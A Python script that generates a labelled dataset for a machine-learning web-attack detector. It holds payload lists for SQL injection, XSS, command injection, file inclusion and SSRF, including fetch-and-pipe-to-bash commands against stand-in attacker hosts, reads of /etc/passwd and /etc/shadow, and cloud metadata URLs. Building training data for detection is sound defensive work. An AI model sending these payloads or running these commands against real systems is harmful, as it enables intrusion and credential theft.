# ml/generate_dataset.py

import random
import csv
import urllib.parse
from feature_extractor import extract_features

OUTPUT_FILE = "dataset.csv"

# ---------- Utilities ----------

def random_case(s):
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in s
    )

def maybe_encode(s):
    if random.random() > 0.5:
        return urllib.parse.quote(s, safe="")
    return s

def random_param():
    return random.choice(["id", "q", "search", "file", "cmd", "url", "input"])

def random_path():
    return random.choice([
        "/search",
        "/login",
        "/exec",
        "/get",
        "/load",
        "/test",
        "/api/data"
    ])

def make_http(payload):
    method = random.choice(["GET", "POST"])
    param = random_param()
    path = random_path()

    payload = random_case(payload)
    payload = maybe_encode(payload)

    return {
        "method": method,
        "url": path,
        "query": f"{param}={payload}",
        "body": ""
    }

# ---------- Attack Families ----------

SQLI = [
    # Boolean
    "1 OR 1=1",
    "1' OR '1'='1",
    "admin'--",
    "1 AND 1=1",

    # Union
    "1 UNION SELECT username,password FROM users",
    "1 UNION SELECT NULL,NULL",

    # Time
    "1 AND SLEEP(5)",
    "1 WAITFOR DELAY '0:0:5'",

    # Error
    "1 AND extractvalue(1,concat(0x7e,user(),0x7e))",
]

XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<style>body{background:url(javascript:alert(1))}</style>"
]

CMDI = [
    "ls;whoami",
    "id && whoami",
    "cat /etc/passwd | id",
    "`whoami`",
    "$(whoami)",
    "ping -c 1 127.0.0.1 && id",
    "cat /etc/passwd",
    "wget http://attacker.com/shell.sh",
    "curl http://evil.com/payload.sh | bash",
    "cat /etc/shadow",
    "ls; cat /etc/passwd",
    "whoami && id",
    "$(cat /etc/passwd)",
    "`cat /etc/shadow`"
]

LFI = [
    "/etc/passwd",
    "../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%2f..%2fetc%2fpasswd",
    "../../../../etc/passwd"
]

RFI = [
    "http://evil.com/shell.txt",
    "https://malicious.site/backdoor.php",
    "http://attacker.com/payload.php",
    "https://evil.com/shell.php",
    "http://malicious.com/backdoor.asp",
    "https://attacker.site/payload.sh",
    "http://hacker.ru/shell.php?cmd=id",
    "https://xss.evil.com/inject.php"
]

SSRF = [
    "http://127.0.0.1/admin",
    "http://localhost:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8000/internal",
    "http://0.0.0.0/internal",
    "http://localhost/metadata",
    "http://169.254.169.254/metadata/v1",
    "http://127.0.0.1:22"
]

NORMAL = [
    "books",
    "laptop",
    "category=10",
    "price=200",
    "hello world",
    "product=25"
]

# ---------- Label Mapping ----------

ATTACK_MAP = {
    "NORMAL": 0,
    "SQLI": 1,
    "XSS": 2,
    "CMDI": 3,
    "LFI": 4,
    "RFI": 5,
    "SSRF": 6
}

SEVERITY_MAP = {
    "LOW": 1,
    "MEDIUM": 2,
    "HIGH": 3,
    "CRITICAL": 4
}

# ---------- Generator ----------

def generate(label, payload_pool, severity, count):
    rows = []
    for _ in range(count):
        payload = random.choice(payload_pool)
        http = make_http(payload)

        features = extract_features(http)

        rows.append(
            features + [ATTACK_MAP[label], SEVERITY_MAP[severity]]
        )
    return rows

def main():
    dataset = []

    dataset += generate("NORMAL", NORMAL, "LOW", 800)

    dataset += generate("SQLI",  SQLI,  "HIGH",     400)
    dataset += generate("XSS",   XSS,   "HIGH",     400)
    dataset += generate("CMDI",  CMDI,  "CRITICAL", 400)
    dataset += generate("LFI",   LFI,   "HIGH",     400)
    dataset += generate("RFI",   RFI,   "HIGH",     400)
    dataset += generate("SSRF",  SSRF,  "CRITICAL", 400)

    random.shuffle(dataset)

    with open(OUTPUT_FILE, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerows(dataset)

    print(f"[+] Dataset generated: {len(dataset)} samples")

if __name__ == "__main__":
    main()
